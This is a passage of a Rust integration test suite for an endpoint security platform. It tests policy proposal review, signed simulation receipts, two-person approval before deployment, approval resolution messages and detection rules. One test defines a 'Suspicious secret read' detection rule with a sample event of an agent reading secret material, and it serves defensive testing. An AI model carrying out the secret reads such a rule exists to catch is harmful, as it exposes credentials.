        proposal["preview"]["fleetRuleDiffValidation"]["selectedEndpointCount"],
        2
    );
    assert_eq!(
        proposal["preview"]["fleetRuleDiffValidation"]["selectedEventCount"],
        3
    );
    let endpoint_requests = proposal["preview"]["fleetRuleDiffValidation"]["endpointRequests"]
        .as_array()
        .expect("fleet validation endpoint requests");
    assert_eq!(endpoint_requests.len(), 2);
    assert_eq!(endpoint_requests[0]["endpointAgentId"], "endpoint-policy-1");
    assert_eq!(endpoint_requests[0]["eventCount"], 2);
    assert_eq!(
        endpoint_requests[0]["request"]["path"],
        "/api/v1/agent/edr/policy-events/impact/history"
    );
    assert_eq!(
        endpoint_requests[0]["request"]["body"]["proposedPolicyYaml"],
        "policy:\n  mode: proposed-approved\npolicyEpoch: 99\n"
    );
    assert_eq!(
        endpoint_requests[0]["expectedReceipt"]["ruleId"],
        "endpoint.policy_event_impact"
    );
    let plan_hash = proposal["preview"]["fleetRuleDiffValidation"]["planSha256"]
        .as_str()
        .expect("fleet validation plan hash");
    assert_eq!(plan_hash.len(), 64);
    assert_eq!(
        proposal["preview"]["topLevelChanges"]["changed"][0],
        "policy"
    );
    let proposal_id = proposal["id"]
        .as_str()
        .expect("proposal id missing")
        .to_string();

    let list_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/policies/proposals".to_string(),
        Some(viewer_key),
        None,
    )
    .await;
    assert_eq!(list_resp.0, StatusCode::OK);
    let proposals = list_resp.1.as_array().expect("proposal list");
    assert_eq!(proposals.len(), 1);
    assert_eq!(proposals[0]["id"], proposal_id);

    let get_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/policies/proposals/{proposal_id}"),
        Some(viewer_key),
        None,
    )
    .await;
    assert_eq!(get_resp.0, StatusCode::OK);
    assert_eq!(get_resp.1["id"], proposal_id);
    assert_eq!(
        get_resp.1["preview"]["topLevelChanges"]["changed"][0],
        "policy"
    );

    let invalid_impact_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/policies/proposals/{proposal_id}/impact"),
        Some(member_key),
        Some(serde_json::json!({
            "source": "local_history",
            "summary": "No receipt hash is attached.",
            "changed_verdict_count": 0,
            "blocking_change_count": 0,
            "developer_breakage_score": 0.0,
            "affected_identity_count": 0,
            "affected_tool_count": 0,
            "recommendation": "approve"
        })),
    )
    .await;
    assert_eq!(invalid_impact_resp.0, StatusCode::BAD_REQUEST);

    let proposed_policy_hash = "e".repeat(64);
    let impact_report = serde_json::json!({
        "impactId": "policy-impact-int-1",
        "analyzedAt": now,
        "mode": "current_vs_proposed_policy_event_impact",
        "currentPolicy": {
            "policyVersion": "proposal-test-current",
            "policyHash": "d".repeat(64),
            "policyEpoch": 1
        },
        "proposedPolicy": {
            "policyVersion": "proposal-test-proposed",
            "policyHash": proposed_policy_hash,
            "policyEpoch": 2
        },
        "eventCount": 2,
        "changedCount": 2,
        "allowToBlockCount": 1,
        "trackPosture": true,
        "eventStreamHash": "0x1111111111111111111111111111111111111111111111111111111111111111",
        "currentResultHash": "0x2222222222222222222222222222222222222222222222222222222222222222",
        "proposedResultHash": "0x3333333333333333333333333333333333333333333333333333333333333333",
        "impactHash": "0x4444444444444444444444444444444444444444444444444444444444444444",
        "summary": "endpoint-policy-1 changed two verdicts"
    });
    let impact_report_two = serde_json::json!({
        "impactId": "policy-impact-int-2",
        "analyzedAt": now,
        "mode": "current_vs_proposed_policy_event_impact",
        "currentPolicy": {
            "policyVersion": "proposal-test-current",
            "policyHash": "d".repeat(64),
            "policyEpoch": 1
        },
        "proposedPolicy": {
            "policyVersion": "proposal-test-proposed",
            "policyHash": "f".repeat(64),
            "policyEpoch": 2
        },
        "eventCount": 1,
        "changedCount": 0,
        "allowToBlockCount": 0,
        "trackPosture": true,
        "eventStreamHash": "0x5555555555555555555555555555555555555555555555555555555555555555",
        "currentResultHash": "0x6666666666666666666666666666666666666666666666666666666666666666",
        "proposedResultHash": "0x7777777777777777777777777777777777777777777777777777777777777777",
        "impactHash": "0x8888888888888888888888888888888888888888888888888888888888888888",
        "summary": "endpoint-policy-2 changed no verdicts"
    });
    let impact_evidence_for = |impact: &Value| {
        [
            ("impactId", impact["impactId"].as_str().unwrap().to_string()),
            (
                "eventStreamHash",
                impact["eventStreamHash"].as_str().unwrap().to_string(),
            ),
            (
                "currentResultHash",
                impact["currentResultHash"].as_str().unwrap().to_string(),
            ),
            (
                "proposedResultHash",
                impact["proposedResultHash"].as_str().unwrap().to_string(),
            ),
            (
                "impactHash",
                impact["impactHash"].as_str().unwrap().to_string(),
            ),
            (
                "proposedPolicyHash",
                impact["proposedPolicy"]["policyHash"]
                    .as_str()
                    .unwrap()
                    .to_string(),
            ),
            (
                "proposedPolicyEpoch",
                impact["proposedPolicy"]["policyEpoch"]
                    .as_u64()
                    .unwrap()
                    .to_string(),
            ),
            (
                "eventCount",
                impact["eventCount"].as_u64().unwrap().to_string(),
            ),
            (
                "changedCount",
                impact["changedCount"].as_u64().unwrap().to_string(),
            ),
            (
                "allowToBlockCount",
                impact["allowToBlockCount"].as_u64().unwrap().to_string(),
            ),
            (
                "trackPosture",
                impact["trackPosture"].as_bool().unwrap().to_string(),
            ),
        ]
        .into_iter()
        .map(|(key, value)| {
            serde_json::json!({
                "key": key,
                "valueHash": hush_core::sha256(value.as_bytes()).to_hex_prefixed(),
                "redactionClass": "hash_only",
                "rawValue": null
            })
        })
        .collect::<Vec<_>>()
    };
    let impact_evidence = impact_evidence_for(&impact_report);
    let endpoint_decision = serde_json::json!({
        "schemaVersion": "clawdstrike.endpoint_decision.v1",
        "receiptFamily": "simulation",
        "localSequence": 42,
        "clock": {},
        "signer": {
            "signerIdentity": "endpoint-policy-proposal-int-1",
            "signerPublicKey": impact_receipt_keypair.public_key().to_hex()
        },
        "actor": {
            "endpointId": "endpoint-policy-1"
        },
        "policy": {
            "policyVersion": "proposal-test",
            "policyHash": "d".repeat(64),
            "policyEpoch": 1
        },
        "sensorState": {},
        "decision": {
            "findingId": "policy-impact-int-1",
            "ruleId": "endpoint.policy_event_impact",
            "action": "observe",
            "passed": true
        },
        "graph": {
            "graphSliceId": "policy-impact-int-1",
            "processNodeId": "policy_event_stream",
            "nodeIds": ["policy_event_stream"],
            "edgeIds": []
        },
        "evidence": impact_evidence
    });
    let impact_receipt = hush_core::Receipt::new(
        hush_core::Hash::from_bytes([7u8; 32]),
        hush_core::Verdict::pass(),
    )
    .with_id("receipt-policy-impact-1")
    .with_metadata(serde_json::json!({
        "endpointDecision": endpoint_decision
    }));
    let signed_impact_receipt =
        hush_core::SignedReceipt::sign(impact_receipt, &impact_receipt_keypair)
            .expect("sign policy impact receipt");
    let signed_impact_receipt_value =
        serde_json::to_value(&signed_impact_receipt).expect("signed receipt to json");
    let mut endpoint_decision_two = endpoint_decision.clone();
    endpoint_decision_two["signer"]["signerPublicKey"] =
        serde_json::json!(impact_receipt_keypair_two.public_key().to_hex());
    endpoint_decision_two["actor"]["endpointId"] = serde_json::json!("endpoint-policy-2");
    endpoint_decision_two["decision"]["findingId"] = serde_json::json!("policy-impact-int-2");
    endpoint_decision_two["graph"]["graphSliceId"] = serde_json::json!("policy-impact-int-2");
    endpoint_decision_two["evidence"] = serde_json::json!(impact_evidence_for(&impact_report_two));
    let impact_receipt_two = hush_core::Receipt::new(
        hush_core::Hash::from_bytes([8u8; 32]),
        hush_core::Verdict::pass(),
    )
    .with_id("receipt-policy-impact-2")
    .with_metadata(serde_json::json!({
        "endpointDecision": endpoint_decision_two
    }));
    let signed_impact_receipt_two =
        hush_core::SignedReceipt::sign(impact_receipt_two, &impact_receipt_keypair_two)
            .expect("sign second policy impact receipt");
    let signed_impact_receipt_value_two =
        serde_json::to_value(&signed_impact_receipt_two).expect("second signed receipt to json");
    let subject_prefix = tenant_subject_prefix(&harness.tenant_slug);
    let mut endpoint_one_validation_subscriber = harness
        .nats
        .subscribe(format!(
            "{subject_prefix}.response.command.endpoint.endpoint-policy-1"
        ))
        .await
        .expect("subscribe endpoint-policy-1 validation subject");
    let mut endpoint_two_validation_subscriber = harness
        .nats
        .subscribe(format!(
            "{subject_prefix}.response.command.endpoint.endpoint-policy-2"
        ))
        .await
        .expect("subscribe endpoint-policy-2 validation subject");
    harness.nats.flush().await.expect("nats flush");

    let dispatch_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/policies/proposals/{proposal_id}/fleet-rule-diff/dispatch"),
        Some(&harness.api_key),
        Some(serde_json::json!({})),
    )
    .await;
    assert_eq!(dispatch_resp.0, StatusCode::OK);
    assert_eq!(dispatch_resp.1["requestedEndpointCount"], 2);
    assert_eq!(dispatch_resp.1["dispatchedActionCount"], 2);
    assert_eq!(
        dispatch_resp.1["proposal"]["preview"]["fleetRuleDiffValidation"]["status"],
        "dispatch_requested"
    );
    let validation_plan_sha256 = dispatch_resp.1["validationPlanSha256"]
        .as_str()
        .expect("validation plan hash")
        .to_string();
    let dispatches = dispatch_resp.1["dispatches"]
        .as_array()
        .expect("dispatch array");
    assert_eq!(dispatches.len(), 2);

    let endpoint_one_message = tokio::time::timeout(
        Duration::from_secs(5),
        endpoint_one_validation_subscriber.next(),
    )
    .await
    .expect("endpoint-policy-1 validation publish timeout")
    .expect("endpoint-policy-1 validation subscriber ended");
    let endpoint_one_envelope: Value = serde_json::from_slice(&endpoint_one_message.payload)
        .expect("endpoint-policy-1 validation payload json");
    assert!(spine::verify_envelope(&endpoint_one_envelope)
        .expect("endpoint-policy-1 validation envelope verifies"));
    assert_eq!(
        endpoint_one_envelope["fact"]["actionType"],
        "policy_rule_diff_validation"
    );
    assert_eq!(
        endpoint_one_envelope["fact"]["payload"]["request"]["path"],
        "/api/v1/agent/edr/policy-events/impact/history"
    );
    assert_eq!(
        endpoint_one_envelope["fact"]["payload"]["validationPlanSha256"],
        validation_plan_sha256
    );
    let endpoint_one_action_id = endpoint_one_envelope["fact"]["actionId"]
        .as_str()
        .expect("endpoint-policy-1 action id")
        .to_string();
    let endpoint_one_ack_token = endpoint_one_envelope["fact"]["delivery"]["ackToken"]
        .as_str()
        .expect("endpoint-policy-1 ack token")
        .to_string();

    let endpoint_two_message = tokio::time::timeout(
        Duration::from_secs(5),
        endpoint_two_validation_subscriber.next(),
    )
    .await
    .expect("endpoint-policy-2 validation publish timeout")
    .expect("endpoint-policy-2 validation subscriber ended");
    let endpoint_two_envelope: Value = serde_json::from_slice(&endpoint_two_message.payload)
        .expect("endpoint-policy-2 validation payload json");
    assert!(spine::verify_envelope(&endpoint_two_envelope)
        .expect("endpoint-policy-2 validation envelope verifies"));
    let endpoint_two_action_id = endpoint_two_envelope["fact"]["actionId"]
        .as_str()
        .expect("endpoint-policy-2 action id")
        .to_string();
    let endpoint_two_ack_token = endpoint_two_envelope["fact"]["delivery"]["ackToken"]
        .as_str()
        .expect("endpoint-policy-2 ack token")
        .to_string();

    for (action_id, endpoint_agent_id, ack_token, impact, receipt) in [
        (
            endpoint_one_action_id.clone(),
            "endpoint-policy-1",
            endpoint_one_ack_token,
            impact_report.clone(),
            signed_impact_receipt_value.clone(),
        ),
        (
            endpoint_two_action_id.clone(),
            "endpoint-policy-2",
            endpoint_two_ack_token,
            impact_report_two.clone(),
            signed_impact_receipt_value_two.clone(),
        ),
    ] {
        let ack_resp = request_json(
            &harness.app,
            Method::POST,
            format!("/api/v1/response-actions/{action_id}/agent-acks"),
            None,
            Some(serde_json::json!({
                "targetKind": "endpoint",
                "targetId": endpoint_agent_id,
                "ackToken": ack_token,
                "status": "acknowledged",
                "rawPayload": {
                    "policyRuleDiffValidation": {
                        "proposalId": proposal_id,
                        "validationPlanSha256": validation_plan_sha256,
                        "endpointAgentId": endpoint_agent_id,
                        "impact": impact,
                        "receipt": receipt
                    }
                }
            })),
        )
        .await;
        assert_eq!(ack_resp.0, StatusCode::OK);
        assert_eq!(ack_resp.1["accepted"], true);
    }

    let collect_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/policies/proposals/{proposal_id}/fleet-rule-diff/collect"),
        Some(member_key),
        Some(serde_json::json!({
            "responseActionIds": [endpoint_one_action_id, endpoint_two_action_id]
        })),
    )
    .await;
    assert_eq!(collect_resp.0, StatusCode::OK);
    assert_eq!(collect_resp.1["collectedReceiptCount"], 2);
    assert_eq!(collect_resp.1["collectedEndpointCount"], 2);
    assert_eq!(
        collect_resp.1["proposal"]["impact"]["source"],
        "fleet_history"
    );
    assert_eq!(
        collect_resp.1["proposal"]["impact"]["changedVerdictCount"],
        2
    );
    assert_eq!(
        collect_resp.1["proposal"]["impact"]["blockingChangeCount"],
        1
    );
    assert_eq!(
        collect_resp.1["proposal"]["impact"]["simulationReceiptsVerifiedCount"],
        2
    );
    assert_eq!(
        collect_resp.1["proposal"]["impact"]["fleetRuleDiffCollection"]["collectedReceiptCount"],
        2
    );

    let wrong_receipt_keypair = hush_core::Keypair::generate();
    let wrong_key_impact_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/policies/proposals/{proposal_id}/impact"),
        Some(member_key),
        Some(serde_json::json!({
            "source": "local_history",
            "summary": "Signed receipt with the wrong verification key should fail.",
            "simulation_receipt_id": "receipt-policy-impact-1",
            "simulation_receipt": signed_impact_receipt_value,
            "simulation_receipt_public_key": wrong_receipt_keypair.public_key().to_hex(),
            "changed_verdict_count": 3,
            "blocking_change_count": 1,
            "developer_breakage_score": 12.5,
            "affected_identity_count": 1,
            "affected_tool_count": 2,
            "recommendation": "observe_only"
        })),
    )
    .await;
    assert_eq!(wrong_key_impact_resp.0, StatusCode::BAD_REQUEST);

    let proof_hash = "b".repeat(64);
    let attach_impact_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/policies/proposals/{proposal_id}/impact"),
        Some(member_key),
        Some(serde_json::json!({
            "source": "local_history",
            "summary": "No production developer paths changed in the sampled window.",
            "simulation_receipt_id": "receipt-policy-impact-1",
            "simulation_receipt": signed_impact_receipt_value,
            "simulation_receipt_public_key": impact_receipt_keypair.public_key().to_hex(),
            "changed_verdict_count": 3,
            "blocking_change_count": 1,
            "developer_breakage_score": 12.5,
            "affected_identity_count": 1,
            "affected_tool_count": 2,
            "recommendation": "observe_only",
            "simulation_receipts": [{
                "receipt_id": "receipt-policy-impact-2",
                "receipt": signed_impact_receipt_value_two,
                "public_key": impact_receipt_keypair_two.public_key().to_hex()
            }],
            "proof_hashes": [proof_hash]
        })),
    )
    .await;
    assert_eq!(attach_impact_resp.0, StatusCode::OK);
    assert_eq!(attach_impact_resp.1["impact"]["schemaVersion"], 1);
    assert_eq!(
        attach_impact_resp.1["impact"]["recommendation"],
        "observe_only"
    );
    assert_eq!(
        attach_impact_resp.1["impact"]["simulationReceiptVerified"],
        true
    );
    assert_eq!(
        attach_impact_resp.1["impact"]["simulationReceiptRuleId"],
        "endpoint.policy_event_impact"
    );
    assert_eq!(
        attach_impact_resp.1["impact"]["simulationReceiptEndpointId"],
        "endpoint-policy-1"
    );
    assert_eq!(
        attach_impact_resp.1["impact"]["simulationReceipt"]["receipt"]["receipt_id"],
        "receipt-policy-impact-1"
    );
    let computed_receipt_hash = attach_impact_resp.1["impact"]["simulationReceiptSignedSha256"]
        .as_str()
        .expect("computed signed receipt hash");
    assert_eq!(computed_receipt_hash.len(), 64);
    assert_eq!(
        attach_impact_resp.1["impact"]["simulationReceiptSha256"],
        computed_receipt_hash
    );
    assert_eq!(
        attach_impact_resp.1["impact"]["simulationReceiptsVerifiedCount"],
        2
    );
    assert_eq!(
        attach_impact_resp.1["impact"]["simulationReceiptDistinctEndpointCount"],
        2
    );
    let simulation_receipts = attach_impact_resp.1["impact"]["simulationReceipts"]
        .as_array()
        .expect("simulation receipts summary array");
    assert_eq!(simulation_receipts.len(), 2);
    assert!(simulation_receipts
        .iter()
        .any(|receipt| receipt["endpointId"] == "endpoint-policy-2"));
    assert_eq!(attach_impact_resp.1["impact"]["blockingChangeCount"], 1);
    let impact_attached_by = attach_impact_resp.1["impact_attached_by"]
        .as_str()
        .expect("impact attached-by actor");
    Uuid::parse_str(impact_attached_by).expect("API-key actor id is a UUID");
    assert!(attach_impact_resp.1["impact_attached_at"].is_string());

    let get_with_impact_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/policies/proposals/{proposal_id}"),
        Some(viewer_key),
        None,
    )
    .await;
    assert_eq!(get_with_impact_resp.0, StatusCode::OK);
    assert_eq!(
        get_with_impact_resp.1["impact"]["simulationReceiptId"],
        "receipt-policy-impact-1"
    );

    let member_approve_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/policies/proposals/{proposal_id}/approve-deploy"),
        Some(member_key),
        Some(serde_json::json!({ "note": "member should not deploy" })),
    )
    .await;
    assert_eq!(member_approve_resp.0, StatusCode::FORBIDDEN);

    let active_before =
        policy_distribution::fetch_active_policy_by_tenant_id(&harness.db, harness.tenant_id)
            .await
            .expect("fetch active policy")
            .expect("active policy still present");
    assert_eq!(active_before.version, 1);
    assert!(active_before.policy_yaml.contains("mode: current"));

    let first_approve_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/policies/proposals/{proposal_id}/approve-deploy"),
        Some(&harness.api_key),
        Some(serde_json::json!({ "note": "first approval" })),
    )
    .await;
    assert_eq!(first_approve_resp.0, StatusCode::OK);
    assert_eq!(first_approve_resp.1["proposal"]["status"], "pending");
    assert_eq!(first_approve_resp.1["proposal"]["approval_count"], 1);
    assert_eq!(first_approve_resp.1["proposal"]["approvals_remaining"], 1);
    assert_eq!(first_approve_resp.1["approvals_remaining"], 1);
    assert!(first_approve_resp.1["deployment"].is_null());
    assert_eq!(
        first_approve_resp.1["proposal"]["approved_by"]
            .as_array()
            .expect("approved-by array")
            .len(),
        1
    );

    let active_after_first_approval =
        policy_distribution::fetch_active_policy_by_tenant_id(&harness.db, harness.tenant_id)
            .await
            .expect("fetch active policy")
            .expect("active policy still present after first approval");
    assert_eq!(active_after_first_approval.version, 1);

    let duplicate_approve_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/policies/proposals/{proposal_id}/approve-deploy"),
        Some(&harness.api_key),
        Some(serde_json::json!({ "note": "duplicate approval" })),
    )
    .await;
    assert_eq!(duplicate_approve_resp.0, StatusCode::CONFLICT);

    let approve_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/policies/proposals/{proposal_id}/approve-deploy"),
        Some(admin2_key),
        Some(serde_json::json!({ "note": "approved for test" })),
    )
    .await;
    assert_eq!(approve_resp.0, StatusCode::OK);
    assert_eq!(approve_resp.1["proposal"]["status"], "deployed");
    assert_eq!(approve_resp.1["proposal"]["deployed_policy_version"], 2);
    assert_eq!(approve_resp.1["proposal"]["approval_count"], 2);
    assert_eq!(approve_resp.1["proposal"]["approvals_remaining"], 0);
    assert_eq!(approve_resp.1["approvals_remaining"], 0);
    assert_eq!(
        approve_resp.1["proposal"]["impact"]["recommendation"],
        "observe_only"
    );
    assert_eq!(
        approve_resp.1["proposal"]["review_note"],
        "approved for test"
    );
    assert_eq!(approve_resp.1["deployment"]["agent_count"], 3);

    let deployed_impact_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/policies/proposals/{proposal_id}/impact"),
        Some(member_key),
        Some(serde_json::json!({
            "source": "manual_review",
            "summary": "Too late to attach impact evidence.",
            "simulation_receipt_sha256": "c".repeat(64),
            "changed_verdict_count": 0,
            "blocking_change_count": 0,
            "developer_breakage_score": 0.0,
            "affected_identity_count": 0,
            "affected_tool_count": 0,
            "recommendation": "approve"
        })),
    )
    .await;
    assert_eq!(deployed_impact_resp.0, StatusCode::NOT_FOUND);

    let active_after =
        policy_distribution::fetch_active_policy_by_tenant_id(&harness.db, harness.tenant_id)
            .await
            .expect("fetch active policy")
            .expect("active policy should remain present");
    assert_eq!(active_after.version, 2);
    assert!(active_after.policy_yaml.contains("mode: proposed-approved"));

    let bucket = policy_distribution::policy_sync_bucket(
        &tenant_subject_prefix(&harness.tenant_slug),
        agent_id,
    );
    let js = async_nats::jetstream::new(harness.nats.clone());
    let store = spine::nats_transport::ensure_kv(&js, &bucket, 1)
        .await
        .expect("policy proposal deployment kv should exist");
    let payload = store
        .get(policy_distribution::POLICY_SYNC_KEY)
        .await
        .expect("policy proposal deployment kv get should succeed")
        .expect("policy proposal deployment key should exist");
    let distributed: Value =
        serde_yaml::from_slice(payload.as_ref()).expect("distributed proposal policy yaml parses");
    assert_eq!(distributed["policy_epoch"], 2);
    assert_eq!(distributed["policy"]["mode"], "proposed-approved");
    assert!(distributed.get("policyEpoch").is_none());

    let self_approve_create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/policies/proposals".to_string(),
        Some(admin2_key),
        Some(serde_json::json!({
            "policy_yaml": "policy:\n  mode: self-approval-blocked\n",
            "description": "proposal self approval"
        })),
    )
    .await;
    assert_eq!(self_approve_create_resp.0, StatusCode::OK);
    let self_approve_proposal_id = self_approve_create_resp.1["proposal"]["id"]
        .as_str()
        .expect("self-approval proposal id")
        .to_string();
    let self_approve_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/policies/proposals/{self_approve_proposal_id}/approve-deploy"),
        Some(admin2_key),
        Some(serde_json::json!({ "note": "self approval should fail" })),
    )
    .await;
    assert_eq!(self_approve_resp.0, StatusCode::CONFLICT);

    let reject_create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/policies/proposals".to_string(),
        Some(member_key),
        Some(serde_json::json!({
            "policy_yaml": "policy:\n  mode: rejected-proposal\n",
            "description": "proposal rejection"
        })),
    )
    .await;
    assert_eq!(reject_create_resp.0, StatusCode::OK);
    let reject_proposal_id = reject_create_resp.1["proposal"]["id"]
        .as_str()
        .expect("reject proposal id")
        .to_string();

    let reject_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/policies/proposals/{reject_proposal_id}/reject"),
        Some(&harness.api_key),
        Some(serde_json::json!({ "note": "reject for test" })),
    )
    .await;
    assert_eq!(reject_resp.0, StatusCode::OK);
    assert_eq!(reject_resp.1["status"], "rejected");
    assert_eq!(reject_resp.1["review_note"], "reject for test");

    let rejected_approve_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/policies/proposals/{reject_proposal_id}/approve-deploy"),
        Some(&harness.api_key),
        Some(serde_json::json!({ "note": "should not deploy rejected proposal" })),
    )
    .await;
    assert_eq!(rejected_approve_resp.0, StatusCode::NOT_FOUND);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn agent_effective_policy_fails_closed_for_unresolved_matching_policy_ref() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let keypair = hush_core::Keypair::generate();
    let register_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/agents".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "agent_id": "agent-policy-ref-int-1",
            "name": "Policy Ref Agent",
            "public_key": keypair.public_key().to_hex()
        })),
    )
    .await;
    assert_eq!(register_resp.0, StatusCode::OK);
    let agent_uuid = Uuid::parse_str(
        register_resp.1["id"]
            .as_str()
            .expect("agent id missing from register response"),
    )
    .expect("parse agent uuid");

    sqlx::query::query(
        r#"INSERT INTO policy_attachments (
               tenant_id,
               target_kind,
               priority,
               policy_ref,
               checksum_sha256
           )
           VALUES ($1, 'tenant', 10, $2, md5($2))"#,
    )
    .bind(harness.tenant_id)
    .bind("catalog/default")
    .execute(&harness.db)
    .await
    .expect("seed policy ref attachment");

    let effective_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/agents/{agent_uuid}/effective-policy"),
        Some(&harness.api_key),
        None,
    )
    .await;

    assert_eq!(effective_resp.0, StatusCode::CONFLICT);
    let error = effective_resp.1["error"]
        .as_str()
        .expect("error message missing");
    assert!(
        error.contains("unresolved policy_ref`catalog/default`")
            || error.contains("unresolved policy_ref `catalog/default`")
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn approvals_list_and_resolve_publish_signed_payload_and_mark_outbox_sent() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let approval_id = Uuid::new_v4();
    let request_id = "apr-int-1";
    let agent_id = "agent-integration-1";

    sqlx::query::query(
        r#"INSERT INTO approvals (
               id,
               tenant_id,
               agent_id,
               request_id,
               event_type,
               event_data,
               status
           )
           VALUES ($1, $2, $3, $4, 'approval.request', '{}'::jsonb, 'pending')"#,
    )
    .bind(approval_id)
    .bind(harness.tenant_id)
    .bind(agent_id)
    .bind(request_id)
    .execute(&harness.db)
    .await
    .expect("seed approval");

    let list_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/approvals".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(list_resp.0, StatusCode::OK);
    assert_eq!(
        list_resp.1.as_array().expect("array response").len(),
        1,
        "pending approval should be listed"
    );

    let subject = format!(
        "{}.approval.response.{}",
        tenant_subject_prefix(&harness.tenant_slug),
        agent_id
    );
    let js = async_nats::jetstream::new(harness.nats.clone());
    spine::nats_transport::ensure_stream(
        &js,
        "approval-response-integration",
        vec![subject.clone()],
        1,
    )
    .await
    .expect("approval response stream should exist");
    let mut subscriber = harness
        .nats
        .subscribe(subject.clone())
        .await
        .expect("subscribe");
    harness.nats.flush().await.expect("nats flush");

    let resolve_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/approvals/{approval_id}/resolve"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "resolution": "approved",
            "resolved_by": "integration-tester"
        })),
    )
    .await;
    assert_eq!(resolve_resp.0, StatusCode::OK);
    assert_eq!(resolve_resp.1["status"], "approved");

    let message = tokio::time::timeout(Duration::from_secs(5), subscriber.next())
        .await
        .expect("approval response publish timeout")
        .expect("subscriber stream ended");
    let envelope: Value =
        serde_json::from_slice(&message.payload).expect("resolution payload should be JSON");
    assert!(
        spine::verify_envelope(&envelope).expect("envelope verification should run"),
        "approval resolution payload must be a signed spine envelope"
    );
    assert_eq!(envelope["fact"]["request_id"], request_id);
    assert_eq!(envelope["fact"]["resolution"], "approved");
    assert_eq!(envelope["fact"]["resolved_by"], "integration-tester");

    let row = sqlx::query::query(
        "SELECT status, attempts FROM approval_resolution_outbox WHERE approval_id = $1",
    )
    .bind(approval_id)
    .fetch_one(&harness.db)
    .await
    .expect("outbox row should exist");
    let status: String = row.try_get("status").expect("status");
    let attempts: i32 = row.try_get("attempts").expect("attempts");
    assert_eq!(status, "sent");
    assert!(attempts >= 1);
}
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn detections_rule_crud_and_test_flow_work() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/detections/rules".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Suspicious secret read",
            "description": "Detect test secret reads",
            "severity": "high",
            "source_format": "native_correlation",
            "execution_mode": "streaming",
            "source_text": "schema: clawdstrike.hunt.correlation.v1\nname: suspicious-secret-read\nseverity: high\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    target_pattern: secret\n    bind: secret_read\noutput:\n  title: Secret read detected\n  evidence:\n    - secret_read\n",
            "tags": ["test", "detection"],
            "enabled": true
        })),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::OK);
    let rule_id = create_resp.1["id"].as_str().expect("rule id");
    assert_eq!(create_resp.1["engine_kind"], "correlation");

    let update_resp = request_json(
        &harness.app,
        Method::PATCH,
        format!("/api/v1/detections/rules/{rule_id}"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "description": "Detect test secret reads v2",
            "enabled": false
        })),
    )
    .await;
    assert_eq!(update_resp.0, StatusCode::OK);
    assert_eq!(update_resp.1["description"], "Detect test secret reads v2");
    assert_eq!(update_resp.1["enabled"], false);
    assert_eq!(update_resp.1["created_by"], create_resp.1["created_by"]);

    let list_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/detections/rules".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(list_resp.0, StatusCode::OK);
    assert_eq!(list_resp.1.as_array().expect("rules array").len(), 1);

    let test_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/detections/rules/{rule_id}/test"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "sample_events": [{
                "timestamp": "2026-03-06T00:00:00Z",
                "source": "receipt",
                "summary": "agent read secret material",
                "verdict": "allow",
                "severity": "high",
                "action_type": "file"
            }]
        })),
    )
    .await;
    assert_eq!(test_resp.0, StatusCode::OK);
    assert_eq!(test_resp.1["valid"], true);
    assert_eq!(
        test_resp.1["findings"]
            .as_array()
            .expect("findings array")
            .len(),
        1
    );
    assert_eq!(test_resp.1["findings"][0]["title"], "Secret read detected");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn detections_suppression_marks_findings_without_deleting_evidence() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let detection_service = AlerterService::new(harness.db.clone());
    let rule = detection_service
        .create_detection_rule(
            harness.tenant_id,
            "integration-test",
            crate::services::alerter::CreateDetectionRule {
                name: "suppression-test".to_string(),
                description: Some("suppression coverage".to_string()),
                severity: "medium".to_string(),
                source_format: "native_correlation".to_string(),
                execution_mode: "streaming".to_string(),
                source_text: Some("schema: clawdstrike.hunt.correlation.v1\nname: suppression-test\nseverity: medium\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    bind: evt\noutput:\n  title: Suppression test\n  evidence:\n    - evt\n".to_string()),
                source_object: None,
                tags: Some(vec!["test".to_string()]),
